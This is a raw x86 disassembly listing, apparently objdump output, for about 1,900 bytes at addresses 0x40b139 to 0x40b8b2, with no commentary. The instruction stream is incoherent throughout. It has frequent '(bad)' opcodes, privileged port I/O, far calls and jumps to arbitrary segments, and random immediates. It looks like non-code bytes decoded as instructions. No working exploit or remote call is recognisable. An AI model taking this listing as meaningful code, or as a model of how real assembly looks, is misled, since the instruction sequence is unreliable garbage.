  40b139:	ret    0x2e8a
  40b13c:	in     eax,dx
  40b13d:	hlt    
  40b13e:	cmovl  eax,DWORD PTR [esi]
  40b141:	mov    ebx,0x1a3a3c0c
  40b146:	in     eax,dx
  40b147:	sahf   
  40b148:	or     ebx,ecx
  40b14a:	aad    0x19
  40b14c:	fwait
  40b14d:	ret    
  40b14e:	fs xor edi,ebp
  40b151:	shl    esp,0x2c
  40b154:	mov    esi,0xb7210566
  40b159:	mov    ds:0x514c92ed,eax
  40b15e:	add    esi,DWORD PTR [ebx+0x283f6aca]
  40b164:	sub    dl,BYTE PTR [edx+0x6dba24b8]
  40b16a:	test   eax,0x3fd6659d
  40b16f:	imul   ebp,DWORD PTR ds:0x25bba2cf,0x737a9a80
  40b179:	sar    BYTE PTR [ebp+0x74],cl
  40b17c:	sub    BYTE PTR [edx+0x4e],0xf8
  40b180:	imul   ebp,edx,0xffffff95
  40b183:	stos   DWORD PTR es:[edi],eax
  40b184:	mov    edi,0x75e0a6a0
  40b189:	jg     0x40b1b2
  40b18b:	(bad)  
  40b18c:	rol    DWORD PTR ds:0x992c778,cl
  40b192:	inc    edi
  40b193:	pop    ecx
  40b194:	call   0xced7:0x461b436b
  40b19b:	pushf  
  40b19c:	inc    edx
  40b19d:	xchg   DWORD PTR [esi+0x61],edi
  40b1a0:	add    eax,0x6b25fe84
  40b1a5:	jl     0x40b174
  40b1a7:	xchg   DWORD PTR [ebx],ebx
  40b1a9:	cmp    edx,DWORD PTR [ecx-0x2cd58dd2]
  40b1af:	pop    es
  40b1b0:	jmp    0x40b1f5
  40b1b2:	fucomi st,st(0)
  40b1b4:	daa    
  40b1b5:	in     al,dx
  40b1b6:	xchg   ebp,eax
  40b1b7:	rol    DWORD PTR [edx-0x7a],cl
  40b1ba:	add    al,0xaf
  40b1bc:	jmp    0x40b1d4
  40b1be:	in     eax,dx
  40b1bf:	retf   0xdf0c
  40b1c2:	mov    eax,ds:0x8b4fc9f
  40b1c7:	or     eax,0x2134f8ac
  40b1cc:	sti    
  40b1cd:	xor    eax,0xaa8d272f
  40b1d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1d3:	sbb    edi,esp
  40b1d5:	pop    ds
  40b1d6:	adc    ebx,0xb738e085
  40b1dc:	popa   
  40b1dd:	into   
  40b1de:	xor    ebx,DWORD PTR [eax-0x4]
  40b1e1:	push   edx
  40b1e2:	mov    al,0x19
  40b1e4:	je     0x40b1ca
  40b1e6:	js     0x40b1bf
  40b1e8:	xor    BYTE PTR [esi],cl
  40b1ea:	xchg   esp,eax
  40b1eb:	sub    DWORD PTR [ecx+0x61ad5280],esi
  40b1f1:	add    DWORD PTR [eax-0x4afe7c4],ecx
  40b1f7:	in     al,dx
  40b1f8:	push   ss
  40b1f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1fa:	sub    BYTE PTR [esp+ecx*4],0x7
  40b1fe:	pop    ss
  40b1ff:	(bad)  
  40b200:	jge    0x40b18b
  40b202:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b203:	sub    al,0x8c
  40b205:	pop    ds
  40b206:	rcr    DWORD PTR [edi+0x5a],1
  40b209:	jmp    0x3b97:0x4a906d1d
  40b210:	fisttp QWORD PTR [ecx]
  40b212:	sbb    ecx,DWORD PTR [edi-0x73]
  40b215:	cmp    eax,0x8581cd77
  40b21a:	aad    0xae
  40b21c:	sahf   
  40b21d:	xor    bh,BYTE PTR [ebx+0x7]
  40b220:	hlt    
  40b221:	sub    BYTE PTR [edx-0x4cac9058],al
  40b227:	outs   dx,DWORD PTR ds:[esi]
  40b228:	add    edx,DWORD PTR [edi]
  40b22a:	fst    QWORD PTR [esp+edx*8-0x8]
  40b22e:	rcl    DWORD PTR [edx-0x2c],1
  40b231:	clc    
  40b232:	leave  
  40b233:	sbb    DWORD PTR [edx-0x36],edi
  40b236:	mov    esi,0xcf3fd41c
  40b23b:	cmp    ah,BYTE PTR [eax-0x1b]
  40b23e:	popf   
  40b23f:	pcmpgtw mm6,QWORD PTR [eax]
  40b242:	mov    ch,0x54
  40b244:	out    dx,eax
  40b245:	xlat   BYTE PTR ds:[ebx]
  40b246:	mov    WORD PTR ds:0x91ba8e9c,ss
  40b24c:	add    DWORD PTR [ebx-0x6d61ebd3],ecx
  40b252:	daa    
  40b253:	cdq    
  40b254:	pop    edi
  40b255:	xor    eax,0x58b09763
  40b25a:	sub    ecx,edx
  40b25c:	cmp    BYTE PTR [eax],bh
  40b25e:	pop    edx
  40b25f:	test   al,0x48
  40b261:	dec    edx
  40b262:	xor    DWORD PTR [edi-0x3f],0x5a
  40b266:	sbb    al,0xb
  40b268:	mov    ch,0xdb
  40b26a:	or     DWORD PTR ds:0x77bd1591,ecx
  40b270:	sbb    edx,DWORD PTR [eiz*8+0x3962b678]
  40b277:	xor    eax,0x63464163
  40b27c:	push   ecx
  40b27d:	(bad)  
  40b27e:	sub    bh,bh
  40b280:	cmp    ah,al
  40b282:	mov    gs,eax
  40b284:	inc    esi
  40b285:	mov    bh,0x5
  40b287:	xchg   ebx,eax
  40b288:	add    al,dl
  40b28a:	mov    eax,ds:0xae1aabdc
  40b28f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b290:	push   esp
  40b291:	jno    0x40b281
  40b293:	pusha  
  40b294:	stc    
  40b295:	lea    edx,[edi+0x4581f46]
  40b29b:	mov    edi,0x1bf9cb10
  40b2a0:	lahf   
  40b2a1:	int    0xb6
  40b2a3:	xor    DWORD PTR [eax],edx
  40b2a5:	rcr    dh,1
  40b2a7:	adc    DWORD PTR [ebx],esp
  40b2a9:	cmp    ah,BYTE PTR [ebx-0x20]
  40b2ac:	jp     0x40b2ee
  40b2ae:	outs   dx,BYTE PTR ds:[esi]
  40b2af:	in     al,dx
  40b2b0:	lods   al,BYTE PTR ds:[esi]
  40b2b1:	cmp    eax,0xe6c785ef
  40b2b6:	dec    eax
  40b2b7:	mov    fs,WORD PTR es:[ecx-0x6feeaad0]
  40b2be:	sub    al,0xf0
  40b2c0:	pop    edi
  40b2c1:	xchg   ecx,eax
  40b2c2:	sub    BYTE PTR [edi+0x649d11d7],al
  40b2c8:	popa   
  40b2c9:	test   bl,ah
  40b2cb:	div    DWORD PTR [eax+eax*8-0x6c91a45]
  40b2d2:	ss int 0xcf
  40b2d5:	xchg   DWORD PTR [ebp+0x1],esi
  40b2d8:	stos   BYTE PTR es:[edi],al
  40b2d9:	jbe    0x40b2c0
  40b2db:	in     eax,0xcb
  40b2dd:	(bad)  
  40b2de:	std    
  40b2df:	add    ebp,ecx
  40b2e1:	push   ebp
  40b2e2:	push   ebx
  40b2e3:	popf   
  40b2e4:	mov    ds:0xd6ef44fb,eax
  40b2e9:	les    eax,FWORD PTR [edi-0xc9abd81]
  40b2ef:	das    
  40b2f0:	idiv   DWORD PTR [ebx]
  40b2f2:	jmp    0x31b2ed7
  40b2f7:	cmp    al,0x7d
  40b2f9:	fs mov esp,0x40f9e702
  40b2ff:	cwde   
  40b300:	cmp    edi,DWORD PTR [esi]
  40b302:	xor    esp,edi
  40b304:	fisttp QWORD PTR [esi+eiz*2+0x23]
  40b308:	stc    
  40b309:	add    al,0x4a
  40b30b:	jo     0x40b2cc
  40b30d:	add    dh,al
  40b30f:	mov    dh,0x8a
  40b311:	pop    edi
  40b312:	cmp    al,0xd3
  40b314:	imul   BYTE PTR [edi]
  40b316:	jmp    0x2a4f2da5
  40b31b:	inc    ebx
  40b31c:	sahf   
  40b31d:	pusha  
  40b31e:	mov    al,ds:0x28edc6b0
  40b323:	push   bp
  40b325:	sub    eax,0xcf6c34b3
  40b32a:	(bad)  
  40b32b:	dec    ebx
  40b32c:	js     0x40b2e8
  40b32e:	push   ss
  40b32f:	push   ss
  40b330:	push   0x3f
  40b332:	cld    
  40b333:	add    ebx,DWORD PTR [eax-0x1af5beab]
  40b339:	mov    ch,0x26
  40b33b:	sbb    ebp,ebp
  40b33d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b33e:	cmp    al,0x94
  40b340:	fs ret 0x16f7
  40b344:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b345:	mov    ds:0xfd54f090,al
  40b34a:	arpl   WORD PTR [esi-0x4d1be51d],si
  40b350:	add    ch,BYTE PTR [ebx+ebx*2-0x607623db]
  40b357:	adc    al,0xff
  40b359:	sbb    esp,0x3e
  40b35c:	adc    eax,0x3b7f41ef
  40b361:	std    
  40b362:	push   esi
  40b363:	push   ds
  40b364:	int    0x15
  40b366:	sub    eax,0xaab153e
  40b36b:	dec    esi
  40b36c:	and    DWORD PTR [ecx+0x33],0x6d
  40b370:	push   esp
  40b371:	mov    esp,0xab3184cb
  40b376:	(bad)  
  40b377:	and    ah,BYTE PTR [ebp+edi*1-0x46]
  40b37b:	xchg   ecx,eax
  40b37c:	adc    BYTE PTR [edx-0x32ef4a12],dl
  40b382:	in     al,0x3e
  40b384:	(bad)
  40b387:	push   es
  40b388:	leave  
  40b389:	xchg   esp,eax
  40b38a:	in     ax,dx
  40b38c:	ds ss out dx,eax
  40b38f:	sahf   
  40b390:	test   BYTE PTR ds:0x2f56b1ca,0x77
  40b397:	int    0xcf
  40b399:	enter  0xb56d,0xa
  40b39d:	out    0x79,eax
  40b39f:	xchg   ebp,eax
  40b3a0:	ror    DWORD PTR [eax],0xc7
  40b3a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3a4:	jns    0x40b380
  40b3a6:	jle    0x40b379
  40b3a8:	inc    eax
  40b3a9:	add    edi,DWORD PTR [edi+0x7f]
  40b3ac:	in     eax,dx
  40b3ad:	dec    ebx
  40b3ae:	jae    0x40b36d
  40b3b0:	shl    BYTE PTR [esi+0x60],1
  40b3b3:	fs dec edi
  40b3b5:	xor    al,0xde
  40b3b7:	imul   eax,DWORD PTR [ecx+0x4226765c],0xffffffa3
  40b3be:	sbb    eax,0x11857fb
  40b3c3:	adc    BYTE PTR [eax-0x26],0xf8
  40b3c7:	dec    eax
  40b3c8:	stos   DWORD PTR es:[edi],eax
  40b3c9:	imul   ebp,edx,0x4d
  40b3cc:	and    BYTE PTR [esi],dl
  40b3ce:	ins    BYTE PTR es:[edi],dx
  40b3cf:	sar    BYTE PTR [esi],cl
  40b3d1:	ss (bad) 
  40b3d4:	addr16 mov esi,0x8065f0b6
  40b3da:	lods   eax,DWORD PTR ds:[esi]
  40b3db:	aas    
  40b3dc:	push   edx
  40b3dd:	pop    ebx
  40b3de:	push   ebx
  40b3df:	mov    bl,0xbb
  40b3e1:	xchg   ebx,edi
  40b3e3:	jne    0x40b41f
  40b3e5:	jo     0x40b3ed
  40b3e7:	call   0x64ae:0x9eb40dab
  40b3ee:	add    eax,0x6d7d0b38
  40b3f3:	hlt    
  40b3f4:	push   ebx
  40b3f5:	inc    ebx
  40b3f6:	into   
  40b3f7:	neg    DWORD PTR [edi]
  40b3f9:	mov    ah,0xb1
  40b3fb:	jns    0x40b3d6
  40b3fd:	and    eax,DWORD PTR [ebp+edx*2-0x591b9bd9]
  40b404:	stos   BYTE PTR es:[edi],al
  40b405:	sbb    edx,DWORD PTR [ecx+edx*8-0x2fe590ba]
  40b40c:	mov    dh,0xca
  40b40e:	or     dl,bh
  40b410:	cwde   
  40b411:	or     esi,DWORD PTR [esp+edx*4-0x79]
  40b415:	pushf  
  40b416:	ret    0x1a13
  40b419:	cdq    
  40b41a:	test   al,0x61
  40b41c:	push   0x39
  40b41e:	aas    
  40b41f:	outs   dx,BYTE PTR ds:[esi]
  40b420:	out    dx,al
  40b421:	shl    DWORD PTR [edx+0x11dc4e3c],1
  40b427:	mov    esi,0x3797c391
  40b42c:	fxch   st(0)
  40b42e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b42f:	out    0xdb,eax
  40b431:	inc    ebx
  40b432:	push   edx
  40b433:	mov    bl,0xa
  40b435:	inc    esi
  40b436:	or     cl,BYTE PTR [esi+edi*1+0x6e]
  40b43a:	mov    edi,0xdd623875
  40b43f:	xchg   edx,eax
  40b440:	xor    edx,ecx
  40b442:	loop   0x40b444
  40b444:	jnp    0x40b3db
  40b446:	jo     0x40b438
  40b448:	sbb    ebp,DWORD PTR [edi]
  40b44a:	add    eax,0x9eff64d5
  40b44f:	in     al,dx
  40b450:	out    dx,al
  40b451:	pushf  
  40b452:	arpl   ax,cx
  40b454:	in     al,0xa0
  40b456:	dec    ebp
  40b457:	pusha  
  40b458:	push   es
  40b459:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b45a:	sbb    BYTE PTR [edx-0x67ee9703],0x8d
  40b461:	mov    cl,BYTE PTR [esi+edi*1+0x44]
  40b465:	adc    DWORD PTR [esi-0x2d],ecx
  40b468:	jmp    0x40b436
  40b46a:	jecxz  0x40b3f5
  40b46c:	ret    0x67e4
  40b46f:	in     al,0xaa
  40b471:	mov    ds:0xd08de838,al
  40b476:	(bad)  
  40b477:	xchg   ebp,eax
  40b478:	mov    bl,0x50
  40b47a:	mov    dh,BYTE PTR [esi+ecx*1-0x76e4699]
  40b481:	pop    esp
  40b482:	and    al,0x9
  40b484:	neg    DWORD PTR [edx+ebx*2+0x133a8185]
  40b48b:	fsub   QWORD PTR [edx+ecx*2+0x19]
  40b48f:	adc    al,0xe
  40b491:	fadd   DWORD PTR [edx-0x11a393e4]
  40b497:	adc    al,0x64
  40b499:	push   0xffffff8a
  40b49b:	fcmovu st,st(2)
  40b49d:	add    al,0x17
  40b49f:	std    
  40b4a0:	cmp    esi,DWORD PTR [esi-0x68]
  40b4a3:	adc    edi,DWORD PTR [edx-0x34430890]
  40b4a9:	dec    edi
  40b4aa:	pop    eax
  40b4ab:	ins    BYTE PTR es:[edi],dx
  40b4ac:	inc    edi
  40b4ad:	jnp    0x40b503
  40b4af:	mov    ch,0x48
  40b4b1:	jns    0x40b51c
  40b4b3:	push   ebx
  40b4b4:	xchg   ebx,eax
  40b4b5:	jnp    0x40b472
  40b4b7:	imul   edi,ebx,0xe3b0beeb
  40b4bd:	rcr    DWORD PTR [esi+0x251e2112],0x8e
  40b4c4:	jo     0x40b4d1
  40b4c6:	inc    edx
  40b4c7:	inc    eax
  40b4c8:	push   esp
  40b4c9:	(bad)  
  40b4cb:	jmp    0xf331:0x6cf61de6
  40b4d2:	imul   ecx,DWORD PTR [ebx+edx*4],0xd403b1bf
  40b4d9:	shl    BYTE PTR [eax-0x1b692ac0],1
  40b4df:	test   al,0x21
  40b4e1:	cmp    al,0x92
  40b4e3:	dec    ecx
  40b4e4:	shl    DWORD PTR [edx],1
  40b4e6:	push   ss
  40b4e7:	in     al,dx
  40b4e8:	jmp    0xa90dee7b
  40b4ed:	in     al,0xf0
  40b4ef:	mov    edi,0x3197cdf2
  40b4f4:	add    eax,0xb218d1de
  40b4f9:	add    DWORD PTR [eax+0x69],esp
  40b4fc:	mov    al,0x39
  40b4fe:	or     eax,0x4429a489
  40b503:	ja     0x40b4b5
  40b505:	sub    al,0x44
  40b507:	mov    BYTE PTR [eax],dl
  40b509:	sub    ebp,DWORD PTR [edx]
  40b50b:	jmp    0x352b6cbd
  40b510:	ror    ecx,cl
  40b512:	ins    BYTE PTR es:[edi],dx
  40b513:	jl     0x40b553
  40b515:	and    ebx,DWORD PTR [eax]
  40b517:	cli    
  40b518:	dec    BYTE PTR [eax-0x4f771838]
  40b51e:	mov    dl,0x2e
  40b520:	ja     0x40b4fd
  40b522:	das    
  40b523:	xor    al,BYTE PTR [esi]
  40b525:	iret   
  40b526:	shr    al,1
  40b528:	stos   BYTE PTR es:[edi],al
  40b529:	sub    DWORD PTR [eax+eax*1-0x34],0x70
  40b52e:	popf   
  40b52f:	scas   eax,DWORD PTR es:[edi]
  40b530:	ret    0xf555
  40b533:	cmp    eax,0xd1c83663
  40b538:	mov    esi,0xa103e1a2
  40b53d:	scas   al,BYTE PTR es:[edi]
  40b53e:	push   0x1b
  40b540:	inc    edi
  40b541:	adc    al,0x99
  40b543:	call   0xcc1d:0x99756624
  40b54a:	out    0xbb,eax
  40b54c:	or     dl,dl
  40b54e:	xchg   ecx,eax
  40b54f:	xchg   esi,eax
  40b550:	and    dh,BYTE PTR [edi+0x1abc1798]
  40b556:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b557:	xor    eax,esi
  40b559:	pop    edx
  40b55a:	arpl   WORD PTR [eax+0x8],ax
  40b55d:	stos   BYTE PTR es:[edi],al
  40b55e:	stos   DWORD PTR es:[edi],eax
  40b55f:	sub    DWORD PTR [edx-0x6545e1d4],0xf3028ad8
  40b569:	jle    0x40b58c
  40b56b:	pop    esi
  40b56c:	mov    bh,0x12
  40b56e:	mov    ds:0xab3be81d,eax
  40b573:	adc    DWORD PTR [ebx],esi
  40b575:	cmp    DWORD PTR [esi+ebp*2+0xd8fe2ba],edx
  40b57c:	mov    ds:0x5ae76c8e,eax
  40b581:	popf   
  40b582:	aam    0xcd
  40b584:	test   DWORD PTR [ebp+0x2c],edi
  40b587:	lock outs dx,DWORD PTR ds:[esi]
  40b589:	ror    BYTE PTR [edx+ecx*8-0xa],cl
  40b58d:	inc    ecx
  40b58e:	test   al,0x49
  40b590:	pop    edi
  40b591:	xor    al,0xd3
  40b593:	mov    cl,0xa5
  40b595:	dec    ebp
  40b596:	mov    edx,0xf6f84c3c
  40b59b:	es retf 
  40b59d:	ins    DWORD PTR es:[edi],dx
  40b59e:	cdq    
  40b59f:	fwait
  40b5a0:	inc    esp
  40b5a1:	in     al,dx
  40b5a2:	sbb    esp,eax
  40b5a4:	loopne 0x40b534
  40b5a6:	ss push ebx
  40b5a8:	jg     0x40b57e
  40b5aa:	mov    al,0xd5
  40b5ac:	icebp  
  40b5ad:	js     0x40b541
  40b5af:	(bad)  
  40b5b0:	xlat   BYTE PTR ds:[ebx]
  40b5b1:	dec    esp
  40b5b2:	pxor   mm7,QWORD PTR [ebx-0x1b]
  40b5b6:	scas   eax,DWORD PTR es:[edi]
  40b5b7:	jne    0x40b5fa
  40b5b9:	scas   al,BYTE PTR es:[edi]
  40b5ba:	pop    ebp
  40b5bb:	mov    ds:0x3044b208,eax
  40b5c0:	cdq    
  40b5c1:	pop    ss
  40b5c2:	ret    
  40b5c3:	or     esp,DWORD PTR [ebp+0x18b87c0d]
  40b5c9:	shl    DWORD PTR [ecx+ebp*8-0x3561b956],0xd6
  40b5d1:	stos   BYTE PTR es:[edi],al
  40b5d2:	inc    ecx
  40b5d3:	and    eax,0xff676718
  40b5d8:	mul    edi
  40b5da:	xchg   ebx,eax
  40b5db:	cmp    DWORD PTR [edx],eax
  40b5dd:	xor    eax,0x17ed2102
  40b5e2:	xor    DWORD PTR gs:[ebp+0x75],edi
  40b5e6:	retf   0xff14
  40b5e9:	push   esi
  40b5ea:	ins    BYTE PTR es:[edi],dx
  40b5eb:	mov    ebx,0x2bac869a
  40b5f0:	ror    BYTE PTR [ebx],0xda
  40b5f3:	or     eax,0xc452a181
  40b5f8:	cmp    eax,0x7b72f1bd
  40b5fd:	iret   
  40b5fe:	pusha  
  40b5ff:	sub    DWORD PTR [ecx*8-0x279780c2],eax
  40b606:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b607:	popa   
  40b608:	je     0x40b67e
  40b60a:	sahf   
  40b60b:	inc    ebx
  40b60c:	ds ja  0x40b632
  40b60f:	mov    ah,0x22
  40b611:	push   ss
  40b612:	add    DWORD PTR [ecx-0x55],0x78faa076
  40b619:	mov    edx,DWORD PTR [ecx]
  40b61b:	aas    
  40b61c:	bound  esi,QWORD PTR [edx-0x41]
  40b61f:	loopne 0x40b662
  40b621:	inc    eax
  40b622:	jne    0x40b69a
  40b624:	add    eax,DWORD PTR [edx+0x16]
  40b627:	fistp  QWORD PTR [eax-0xd]
  40b62a:	pusha  
  40b62b:	fwait
  40b62c:	call   0x5fbdd07a
  40b631:	arpl   WORD PTR [edx+0x4d1f6183],sp
  40b637:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40b639:	cmp    BYTE PTR [eax],dh
  40b63b:	mov    ?,WORD PTR [esi]
  40b63d:	outs   dx,DWORD PTR ds:[esi]
  40b63e:	test   BYTE PTR [edx-0x5e],cl
  40b641:	in     eax,dx
  40b642:	pop    ebx
  40b643:	stos   BYTE PTR es:[edi],al
  40b644:	or     DWORD PTR [esi+esi*4+0x32],esp
  40b648:	leave  
  40b649:	ret    
  40b64a:	pop    esi
  40b64b:	scas   eax,DWORD PTR es:[edi]
  40b64c:	dec    esi
  40b64d:	test   eax,0x166b19e
  40b652:	repnz icebp 
  40b654:	dec    ecx
  40b655:	int3   
  40b656:	mov    esp,0x35b00587
  40b65b:	rol    DWORD PTR [edi-0x2c],1
  40b65e:	int    0x9a
  40b660:	sti    
  40b661:	push   cs
  40b662:	add    BYTE PTR [eax],dh
  40b664:	jnp    0x40b6a2
  40b666:	es jle 0x40b66a
  40b669:	or     esi,ebx
  40b66b:	cmp    BYTE PTR [ecx+edi*1-0x7a],0x79
  40b670:	mov    ecx,0xac2e37cd
  40b675:	(bad)  [edi]
  40b677:	or     eax,0xc93e7260
  40b67c:	into   
  40b67d:	jo     0x40b6ea
  40b67f:	cli    
  40b680:	ficomp DWORD PTR [esi+0x2134e10f]
  40b686:	push   ss
  40b687:	fnstcw WORD PTR [ebp+edx*2-0x1d]
  40b68b:	xor    ebx,DWORD PTR [edi-0x12]
  40b68e:	js     0x40b6c9
  40b690:	dec    esp
  40b691:	ret    
  40b692:	or     ah,bh
  40b694:	jmp    0xf9cf:0x4a6c497
  40b69b:	(bad)  
  40b69d:	pop    ds
  40b69e:	cmp    DWORD PTR [esi-0x3650c201],0x26bdb682
  40b6a8:	gs fs dec esi
  40b6ab:	clc    
  40b6ac:	pop    edi
  40b6ad:	call   0x3a09:0x693c51ca
  40b6b4:	mov    esi,0xe92a6f73
  40b6b9:	mov    al,0x60
  40b6bb:	outs   dx,BYTE PTR ds:[esi]
  40b6bc:	push   esi
  40b6bd:	mov    esp,0xeff4a668
  40b6c2:	fcmovnbe st,st(3)
  40b6c4:	push   esi
  40b6c5:	push   ss
  40b6c6:	jns    0x40b6f5
  40b6c8:	and    ebx,DWORD PTR [edi]
  40b6ca:	jl     0x40b6e9
  40b6cc:	cli    
  40b6cd:	(bad)  
  40b6ce:	push   edx
  40b6cf:	jl     0x40b6c8
  40b6d1:	adc    DWORD PTR [ebp+0x5cdbdf74],0xc090dfc9
  40b6db:	arpl   sp,di
  40b6dd:	jo     0x40b749
  40b6df:	push   es
  40b6e0:	repnz loope 0x40b6e2
  40b6e3:	mov    ch,0xce
  40b6e5:	stos   BYTE PTR es:[edi],al
  40b6e6:	dec    esi
  40b6e7:	push   ds
  40b6e8:	enter  0x1cbe,0x7a
  40b6ec:	js     0x40b68f
  40b6ee:	cs je  0x40b690
  40b6f1:	fbstp  TBYTE PTR [ebp+0x3589a7f3]
  40b6f7:	mov    edx,?
  40b6f9:	push   esp
  40b6fa:	loop   0x40b6b0
  40b6fc:	jg     0x40b6fc
  40b6fe:	pop    ecx
  40b6ff:	pop    ds
  40b700:	add    bh,BYTE PTR [eax+0x77]
  40b703:	pop    esp
  40b704:	mov    ch,0x6f
  40b706:	xchg   ebp,eax
  40b707:	push   esi
  40b708:	in     al,dx
  40b709:	ds push 0x88f894e8
  40b70f:	(bad)  
  40b710:	push   0x68d838a0
  40b715:	call   0x2cae:0xade5c258
  40b71c:	int3   
  40b71d:	or     al,0x83
  40b71f:	pop    esp
  40b720:	call   0xc9bf8cb0
  40b725:	retf   0x8d11
  40b728:	cmp    dh,BYTE PTR [ebp-0x48]
  40b72b:	(bad)  
  40b72c:	pop    edx
  40b72d:	sub    DWORD PTR ds:[edx],ebx
  40b730:	sahf   
  40b731:	imul   ecx,DWORD PTR [edi+0x5f00e0a9],0x1
  40b738:	sub    ch,BYTE PTR [edi]
  40b73a:	retf   
  40b73b:	iret   
  40b73c:	mov    BYTE PTR [ebp-0x6c0a7012],bh
  40b742:	dec    edx
  40b743:	(bad)  
  40b744:	fist   DWORD PTR [ebx]
  40b746:	ins    DWORD PTR es:[edi],dx
  40b747:	push   cs
  40b748:	loope  0x40b70b
  40b74a:	mov    bh,0x17
  40b74c:	adc    dh,dh
  40b74e:	pop    ss
  40b74f:	shl    ebx,cl
  40b751:	xor    eax,0xfdd0ab6c
  40b756:	jmp    0x76ba:0x3587202f
  40b75d:	sbb    bh,bl
  40b75f:	out    dx,eax
  40b760:	xchg   esi,eax
  40b761:	pop    ecx
  40b762:	data16 loopne 0x40b796
  40b765:	lea    edx,[edx-0x7e]
  40b768:	sbb    eax,0x4f491361
  40b76d:	test   eax,0xb6ac28ae
  40b772:	push   0xa075e003
  40b777:	push   ss
  40b778:	mov    esi,0xd50abab
  40b77d:	mov    bh,0x4c
  40b77f:	cmp    al,0xc2
  40b781:	add    al,0xba
  40b783:	and    ebx,DWORD PTR [esi+ecx*1+0xa]
  40b787:	mov    esp,cs
  40b789:	mov    bl,0x5d
  40b78b:	(bad)  
  40b78d:	dec    esp
  40b78e:	xchg   BYTE PTR [ebx+0x34929594],bl
  40b794:	aas    
  40b795:	adc    al,0xfb
  40b797:	dec    ecx
  40b798:	add    dh,BYTE PTR [eax-0x40e47e23]
  40b79e:	jb     0x40b800
  40b7a0:	sub    DWORD PTR [ebx],ecx
  40b7a2:	mov    dh,0x79
  40b7a4:	cmp    DWORD PTR [ebx+0x7a],ebx
  40b7a7:	gs enter 0x8c69,0x11
  40b7ac:	or     DWORD PTR [edi],ebx
  40b7ae:	xlat   BYTE PTR gs:[ebx]
  40b7b0:	dec    esp
  40b7b1:	lock dec ebx
  40b7b3:	sbb    BYTE PTR [eax+ecx*8-0x20a72b1],cl
  40b7ba:	test   BYTE PTR [eax-0x3e],bh
  40b7bd:	shl    DWORD PTR [esi-0x26],0x70
  40b7c1:	xchg   edi,eax
  40b7c2:	test   DWORD PTR [ebx-0x3cef2a5e],eax
  40b7c8:	push   edi
  40b7c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7ca:	pop    ebx
  40b7cb:	fbld   TBYTE PTR [ecx+eax*2+0x3c]
  40b7cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7d0:	dec    ebx
  40b7d1:	sub    BYTE PTR [ebx+0x3f],ch
  40b7d4:	xchg   edi,eax
  40b7d5:	xchg   edi,eax
  40b7d6:	sbb    al,0xb9
  40b7d8:	mov    ss,WORD PTR [edx]
  40b7da:	dec    eax
  40b7db:	loopne 0x40b7c7
  40b7dd:	js     0x40b7b2
  40b7df:	sub    BYTE PTR [ecx],0x55
  40b7e2:	jecxz  0x40b7ae
  40b7e4:	into   
  40b7e5:	fist   WORD PTR [eax]
  40b7e7:	jmp    0x4288:0xd05bc5b0
  40b7ee:	push   0xe9528dbf
  40b7f3:	mov    esp,0x463bd2fa
  40b7f8:	mov    ds:0x5fd4a9fe,al
  40b7fd:	cld    
  40b7fe:	jecxz  0x40b878
  40b800:	dec    esp
  40b801:	lds    esp,FWORD PTR [ebp-0x4af9ddb]
  40b807:	pusha  
  40b808:	dec    esp
  40b809:	ror    BYTE PTR [esi],cl
  40b80b:	sub    bh,BYTE PTR [ebp+0x6898db0b]
  40b811:	xlat   BYTE PTR ds:[ebx]
  40b812:	mov    al,ds:0xda1879f9
  40b817:	jl     0x40b7b7
  40b819:	sbb    al,0xb8
  40b81b:	inc    eax
  40b81c:	lods   al,BYTE PTR ds:[esi]
  40b81d:	(bad)  
  40b81e:	mov    ds:0xe5c5d9a8,al
  40b823:	data16 cmp BYTE PTR [edi-0x6f463862],0x96
  40b82b:	add    esp,DWORD PTR [eax+0x74]
  40b82e:	and    dl,BYTE PTR [ebx+0x4f]
  40b831:	adc    BYTE PTR [eax+0x68],cl
  40b834:	shr    BYTE PTR [esi],0x98
  40b837:	push   edi
  40b838:	stos   DWORD PTR es:[edi],eax
  40b839:	clc    
  40b83a:	and    edx,esp
  40b83c:	pop    esp
  40b83d:	mov    fs,WORD PTR ds:0x11053ed2
  40b843:	cmp    DWORD PTR [ebx-0x46],eax
  40b846:	jbe    0x40b8b2
  40b848:	jmp    0x4b3478b3
  40b84d:	jg     0x40b8c2
  40b84f:	pop    ax
  40b851:	ss push ebx
  40b853:	mov    ch,0x30
  40b855:	hlt    
  40b856:	cmp    DWORD PTR [edx],esi
  40b858:	scas   eax,DWORD PTR es:[edi]
  40b859:	retf   0xdcbc
  40b85c:	hlt    
  40b85d:	adc    DWORD PTR [ecx+0x32],0x18
  40b861:	xchg   ebp,eax
  40b862:	push   cs
  40b863:	xchg   ebp,eax
  40b864:	lds    ebx,FWORD PTR [esi+0x4a]
  40b867:	or     BYTE PTR [ebx+0x7a2149cb],0x89
  40b86e:	or     BYTE PTR [ecx-0x6e54ce7d],bh
  40b874:	or     al,0x56
  40b876:	jns    0x40b8b3
  40b878:	mov    ebx,0xdd2c9093
  40b87d:	push   cs
  40b87e:	mov    edx,0xb2974201
  40b883:	pop    edx
  40b884:	sub    ebp,DWORD PTR [esp+eiz*8]
  40b887:	pop    ebp
  40b888:	jae    0x40b80a
  40b88a:	imul   edi,DWORD PTR [edi-0x1918be7],0xffffff8c
  40b891:	inc    ebx
  40b892:	adc    BYTE PTR [edx-0x556f5d7d],bh
  40b898:	mov    ds:0xb9c0b9b7,al
  40b89d:	cld    
  40b89e:	cmp    BYTE PTR [eax+0x55],dh
  40b8a1:	jmp    0x7a16:0xd566adf3
  40b8a8:	add    eax,0x23b42f0f
  40b8ad:	retf   
  40b8ae:	idiv   BYTE PTR [eax]
  40b8b0:	jno    0x40b8f5
  40b8b2:	xchg   ecx,eax
